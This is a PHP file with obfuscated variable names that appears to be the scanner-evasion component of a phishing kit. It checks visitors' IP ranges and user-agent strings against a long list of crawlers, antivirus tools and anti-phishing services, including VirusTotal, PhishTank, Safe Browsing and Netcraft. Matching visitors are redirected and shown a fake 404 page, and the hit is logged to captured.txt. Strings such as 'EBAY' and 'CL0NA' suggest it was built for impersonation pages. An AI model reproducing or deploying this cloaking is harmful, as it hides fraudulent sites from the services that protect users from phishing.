<?php

$a370a = $_SERVER['REMOTE_ADDR'];
$cd1e = array("^94.26.*.*","^95.85.*.*",);
foreach ($cd1e as $cv1x) {
    if (preg_match('/'.$cv1x.'/', $a370a)) {
        header('Location: error.php');
        $f4c64o = fopen("captured.txt", "a+");
        fwrite($f4c64o, "ip : {$cv1x} | ".date('d/m/Y h:i:sa')."\n\n");
        fclose($f4c64o);
        echo"<br>";
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}$c114d = strtolower($_SERVER['HTTP_USER_AGENT']);
$e97476a = array("gmetrix",
            "headless",
            "virus",
            "virustotal",
            "SiteChecker",
            "cloud",
            "bot",
            "above",
            "google",
            "docomo",
            "mediapartners",
            "phantomjs",
            "lighthouse",
            "reverseshorturl",
            "samsung-sgh-e250",
            "softlayer",
            "amazonaws",
            "cyveillance",
            "crawler",
            "gsa-crawler",
            "phishtank",
            "dreamhost",
            "netpilot",
            "calyxinstitute",
            "tor-exit",
            "apache-httpclient",
            "lssrocketcrawler",
            "urlredirectresolver",
            "jetbrains",
            "spam",
            "windows 95",
            "windows 98",
            "acunetix",
            "netsparker",
            "007ac9",
            "008",
            "Feedfetcher",
            "192.comagent",
            "200pleasebot",
            "360spider",
            "4seohuntbot",
            "50.nu",
            "a6-indexer",
            "admantx",
            "amznkassocbot",
            "aboundexbot",
            "aboutusbot",
            "abrave spider",
            "accelobot",
            "acoonbot",
            "addthis.com",
            "adsbot-google",
            "ahrefsbot",
            "alexabot",
            "amagit.com",
            "analytics",
            "antbot",
            "apercite",
            "aportworm",
            "EBAY",
            "CL0NA",
            "jabber",
            "arabot",
            "hotmail!",
            "msn!",
            "baidu",
            "outlook!",
            "outlook",
            "msn",
            "duckduckbot",
            "hotmail",
            "go-http-client",
            "go-http-client",
            "trident",
            "presto",
            "virustotal",
            "unchaos",
            "dreampassport",
            "sygol",
            "nutch",
            "privoxy",
            "zipcommander",
            "neofonie",
            "abacho",
            "acoi",
            "acoon",
            "adaxas",
            "agada",
            "aladin",
            "alkaline",
            "amibot",
            "anonymizer",
            "aplix",
            "aspseek",
            "avant",
            "baboom",
            "anzwers",
            "anzwerscrawl",
            "crawlconvera",
            "del.icio.us",
            "camehttps",
            "annotate",
            "wapproxy",
            "translate",
            "ask24",
            "asked",
            "askaboutoil",
            "fangcrawl",
            "amzn_assoc",
            "bingpreview",
            "dr.web",
            "drweb",
            "bilbo",
            "blackwidow",
            "sogou",
            "sogou-test-spider",
            "exabot",
            "externalhit",
            "ia_archiver",
            "googletranslate",
            "proxy",
            "dalvik",
            "quicklook",
            "seamonkey",
            "sylera",
            "safebrowsing",
            "safesurfingwidget",
            "preview",
            "whatsapp",
            "telegram",
            "instagram",
            "zteopen",
            "icoreservice",
            "untrusted",
            "crawl",
            "slurp",
            "spider",
            "seek",
            "accoona",
            "adressendeutschland",
            "ah-ha",
            "ahoy",
            "altavista",
            "ananzi",
            "anthill",
            "appie",
            "arachnophilia",
            "arale",
            "araneo",
            "aranha",
            "architext",
            "aretha",
            "arks",
            "asterias",
            "atlocal",
            "atn",
            "atomz",
            "augurfind",
            "backrub",
            "baypup",
            "bdfetch",
            "bigbrother",
            "biglotron",
            "bjaaland",
            "blaiz",
            "bloodhound",
            "boitho",
            "booch",
            "bradley",
            "butterfly",
            "calif",
            "cassandra",
            "ccubee",
            "cfetch",
            "charlotte",
            "churl",
            "cienciaficcion",
            "cmc",
            "collective",
            "comagent",
            "combine",
            "computingsite",
            "csci",
            "curl",
            "cusco",
            "daumoa",
            "deepindex",
            "delorie",
            "depspid",
            "deweb",
            "dieblindekuh",
            "digger",
            "ditto",
            "dmoz",
            "downloadexpress",
            "dtaagent",
            "dwcp",
            "ebiness",
            "ebingbong",
            "e-collector",
            "ejupiter",
            "emacs-w3searchengine",
            "esther",
            "evliyacelebi",
            "ezresult",
            "falcon",
            "felixide",
            "ferret",
            "fetchrover",
            "fido",
            "findlinks",
            "fireball",
            "fishsearch",
            "fouineur",
            "funnelweb",
            "gazz",
            "gcreep",
            "genieknows",
            "getterroboplus",
            "geturl",
            "glx",
            "goforit",
            "golem",
            "grabber",
            "grapnel",
            "gralon",
            "griffon",
            "gromit",
            "grub",
            "gulliver",
            "hamahakki",
            "harvest",
            "havindex",
            "helix",
            "heritrix",
            "hkuwwwoctopus",
            "homerweb",
            "htdig",
            "htmlindex",
            "html_analyzer",
            "htmlgobble",
            "hubater",
            "hyper-decontextualizer",
            "ibm_planetwide",
            "ichiro",
            "iconsurf",
            "iltrovatore",
            "image.kapsi.net",
            "imagelock",
            "incywincy",
            "indexer",
            "infobee",
            "informant",
            "ingrid",
            "inktomisearch.com",
            "inspectorweb",
            "intelliagent",
            "internetshinchakubin",
            "ip3000",
            "iron33",
            "israeli-search",
            "ivia",
            "jakarta",
            "javabee",
            "jetbot",
            "jumpstation",
            "katipo",
            "kdd-explorer",
            "kilroy",
            "knowledge",
            "kototoi",
            "kretrieve",
            "labelgrabber",
            "lachesis",
            "larbin",
            "libwww",
            "linkalarm",
            "linkvalidator",
            "linkscan",
            "lockon",
            "lwp",
            "lycos",
            "magpie",
            "mantraagent",
            "mapoftheinternet",
            "marvin",
            "mattie",
            "mediafox",
            "mercator",
            "merzscope",
            "microsofturlcontrol",
            "minirank",
            "miva",
            "mj12",
            "mnogosearch",
            "moget",
            "monster",
            "moose",
            "motor",
            "multitext",
            "muncher",
            "muscatferret",
            "mwd.search",
            "myweb",
            "najdi",
            "nameprotect",
            "nationaldirectory",
            "nazilla",
            "ncsabeta",
            "nec-meshexplorer",
            "nederland.zoek",
            "netcartawebmapengine",
            "netmechanic",
            "netresearchserver",
            "netscoop",
            "newscan-online",
            "nhse",
            "nokia6682",
            "nomad",
            "noyona",
            "siteexplorer",
            "nzexplorer",
            "objectssearch",
            "occam",
            "omni",
            "opentext",
            "openfind",
            "openintelligencedata",
            "orbsearch",
            "osis-project",
            "packrat",
            "pageboy",
            "pagebull",
            "page_verifier",
            "panscient",
            "parasite",
            "partnersite",
            "patric",
            "pegasus",
            "peregrinator",
            "pgpkeyagent",
            "phantom",
            "phpdig",
            "picosearch",
            "piltdownman",
            "pimptrain",
            "pinpoint",
            "pioneer",
            "piranha",
            "plumtreewebaccessor",
            "pogodak",
            "poirot",
            "pompos",
            "poppelsdorf",
            "poppi",
            "populariconoclast",
            "psycheclone",
            "publisher",
            "python",
            "rambler",
            "ravensearch",
            "roach",
            "roadrunner",
            "roadhouse",
            "robbie",
            "robofox",
            "robozilla",
            "rules",
            "salty",
            "sbider",
            "scooter",
            "scoutjet",
            "scrubby",
            "search.",
            "searchprocess",
            "semanticdiscovery",
            "senrigan",
            "sg-scout",
            "shai'hulud",
            "shark",
            "shopwiki",
            "sidewinder",
            "sift",
            "silk",
            "simmany",
            "sitesearcher",
            "sitevalet",
            "sitetech-rover",
            "skymob.com",
            "sleek",
            "smartwit",
            "sna-",
            "snappy",
            "snooper",
            "sohu",
            "speedfind",
            "sphere",
            "sphider",
            "spinner",
            "spyder",
            "steeler",
            "suke",
            "suntek",
            "supersnooper",
            "surfnomore",
            "sven",
            "szukacz",
            "tachblackwidow",
            "tarantula",
            "templeton",
            "teoma",
            "t-h-u-n-d-e-r-s-t-o-n-e",
            "theophrastus",
            "titan",
            "titin",
            "tkwww",
            "toutatis",
            "t-rex",
            "tutorgig",
            "twiceler",
            "twisted",
            "ucsd",
            "udmsearch",
            "urlcheck",
            "updated",
            "vagabondo",
            "valkyrie",
            "verticrawl",
            "victoria",
            "vision-search",
            "volcano",
            "voyager",
            "voyager-hc",
            "w3c_validator",
            "w3m2",
            "w3mir",
            "walker",
            "wallpaper",
            "wanderer",
            "wauuu",
            "wavefire",
            "webcore",
            "webhopper",
            "webwombat",
            "webbandit",
            "webcatcher",
            "webcopy",
            "webfoot",
            "weblayers",
            "weblinker",
            "weblogmonitor",
            "webmirror",
            "webmonkey",
            "webquest",
            "webreaper",
            "websitepulse",
            "websnarf",
            "webstolperer",
            "webvac",
            "webwalk",
            "webwatch",
            "webzinger",
            "wget",
            "whizbang",
            "whowhere",
            "wildferret",
            "worldlight",
            "wwwc",
            "wwwster",
            "xenu",
            "xget",
            "xift",
            "xirq",
            "yandex",
            "yanga",
            "yeti",
            "yodao",
            "zao",
            "zippp",
            "zyborg",
            "proximic",
            "Googlebot",
            "Baiduspider",
            "Cliqzbot",
            "Genieo",
            "BomboraBot",
            "CCBot",
            "URLAppendBot",
            "DomainAppender",
            "msnbot-media",
            "Antivirus",
            "YoudaoBot",
            "MJ12bot",
            "linkdexbot",
            "applebot",
            "metauri.com",
            "Twitterbot",
            "R6_FeedFetcher",
            "NetcraftSurveyAgent",
            "Sogouwebspider",
            "bingbot",
            "Yahoo!Slurp",
            "facebookexternalhit",
            "PrintfulBot",
            "msnbot",
            "UnwindFetchor",
            "urlresolver",
            "TweetmemeBot",
            "PaperLiBot",
            "Ezooms",
            "YandexBot",
            "SearchmetricsBot",
            "picsearch",
            "TweetedTimesBot",
            "QuerySeekerSpider",
            "ShowyouBot",
            "woriobot",
            "merlinkbot",
            "BazQuxBot",
            "Kraken",
            "SISTRIXCrawler",
            "R6_CommentReader",
            "magpie-crawler",
            "GrapeshotCrawler",
            "PercolateCrawler",
            "MaxPointCrawler",
            "NetSeercrawler",
            "grokkit-crawler",
            "SMXCrawler",
            "PulseCrawler",
            "Y!J-BRW",
            "Mediapartners-Google",
            "Spinn3r",
            "InAGist",
            "Python-urllib",
            "NING",
            "TencentTraveler",
            "Feedfetcher-Google",
            "mon.itor.us",
            "spbot",
            "Feedly",
            "java",
            "crawler",
            "Lighthouse");
foreach ($e97476a as $d3e7e) {
    if (substr_count($c114d, strtolower($d3e7e)) > 0 or $c114d == "" or $c114d == " " or $c114d == "	") {
        header('Location: error.php');
        $f4c64i = fopen("captured.txt", "a+");
        fwrite($f4c64i, "ip : {$cv1x} | ".date('d/m/Y h:i:sa')."\n\n");
        fclose($f4c64i);
        echo"<br>";
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}